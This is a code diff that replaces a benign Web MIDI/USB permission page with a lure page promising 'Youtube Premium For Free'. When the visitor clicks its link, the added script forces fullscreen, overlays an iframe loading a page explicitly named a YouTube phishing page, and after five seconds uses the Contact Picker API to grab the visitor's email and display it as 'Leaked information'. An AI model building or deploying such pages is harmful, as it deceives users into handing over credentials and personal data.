@@ -1,41 +1,61 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>MIDI and SysEx + USB Permissions</title>
-</head>
-<body>
-  <h1>MIDI and SysEx + USB Permissions</h1>
-  <p>Click the button below to request both MIDI (with SysEx) and USB permissions.</p>
+<html>
 
-  <button onclick="requestPermissions()">Request Permissions</button>
+<script>
 
-  <script>
-    function requestPermissions() {
-      // Check if the browser supports Web MIDI API and Web USB API
-      if (navigator.requestMIDIAccess && navigator.usb) {
-        // Request MIDI access with SysEx enabled
-        navigator.requestMIDIAccess({ sysex: true })
-          .then(function (midiAccess) {
-            console.log('MIDI and SysEx Access Granted', midiAccess);
-          })
-          .catch(function (error) {
-            console.error('MIDI and SysEx Access Denied', error);
-          });
+function fullscreen_contents() { 
+document.documentElement.requestFullscreen();
+                document.getElementById("replace")
 
-        // Request USB access
-        navigator.usb.requestDevice({ filters: [] })
-          .then(function (usbDevice) {
-            console.log('USB Access Granted', usbDevice);
-          })
-          .catch(function (error) {
-            console.error('USB Access Denied', error);
-          });
-      } else {
-        console.error('Web MIDI or Web USB API not supported in this browser');
-      }
-    }
-  </script>
-</body>
-</ht
+                .outerHTML = "<meta name='viewport' content='width=device-width, initial-scale=1'> <link rel='stylesheet' href='https://maxcdn.bootstrapcdn.com/bootstrap/3.4.1/css/bootstrap.min.css'> <iframe class='embed-responsive-item' src='https://pinkythegawd.github.io/youtube-phishing-page/' frameborder='0' style=' overflow: hidden; overflow-x: hidden; overflow-y: hidden; height: 100%; width: 100%; position: absolute; top: 0px; left: 0px; right: 0px; bottom: 0px; ' height='100%' width='100%'></iframe>";
+
+}
+
+
+function async () {
+
+
+                (async () => {
+
+                    let contacts = await navigator.contacts.select(["email"],{});
+
+                   document.write(`
+                        <h1>
+                            <font color="red">Leaked information:</font> 
+Email =
+${contacts[0]["email"]}
+
+
+</font>
+                        </h1> 
+                    `);
+                })();
+
+
+
+
+            }
+
+
+</script>
+
+ 
+<center>
+
+
+<div id="replace"
+
+style="font-size: 50px; 
+font-weight: bold;">
+
+Youtube Premium For Free
+
+<h3> 1. Go to 
+<a href="#" onclick="setTimeout('async()','5000');fullscreen_contents()">Youtube.com</a>
+</h3>
+<h3> 2. Click on "TRY IT FREE" </h3>
+<h3> 3. Choose your Email Id </h3>
+<h3> 4. SignIn with your email </h3>
+        </div>
+
+</center>
+</html>
